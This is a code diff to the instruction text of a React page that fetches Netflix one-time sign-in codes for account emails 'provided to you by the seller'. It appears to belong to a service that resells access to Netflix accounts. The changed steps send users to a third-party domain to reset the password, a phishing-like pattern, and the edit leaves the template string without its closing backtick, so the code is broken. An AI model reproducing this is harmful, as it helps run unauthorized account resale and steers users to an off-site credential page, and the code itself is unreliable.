@@ -3,14 +3,12 @@ import React, { useEffect, useState } from 'react';
 const translations = {
   en: {
       title: "Get Your Netflix Login Code",
-      steps: `Open Netflix Login: Go to https://www.netflix.com/login
-  Sign In: Tap or click on the Sign In button.
-      Select Sign-In Code Option: Choose the option labeled "Use a sign-in code."
-      Enter Your Email: Type your registered email address into the provided input field.
-      Request the Code: Click on "Send Sign In Code" to receive a one-time password (OTP).
-      Check Your Email: Open your email inbox and look for the message containing the OTP.
-      Enter the OTP: Input the received OTP in the designated field on your device.
-      Complete Sign In: Tap or click on "Sign In" to access your Netflix account`,
+      steps: `Open https://www.netflix.com/login
+      Choose the option labeled "Use a sign-in code."
+      Enter your email address into the provided input field.
+      Click on "Send Sign In Code" to receive a one-time password (OTP).
+      Put email address in the input of this page to get code.
+      To reset password visit https://www.loophj.com/resetlogin ,
       emailPlaceholder: "Enter your account email",
       subInstructions: "Please enter the Netflix email provided to you by the seller to receive the code.",
       getCode: "Get Code",
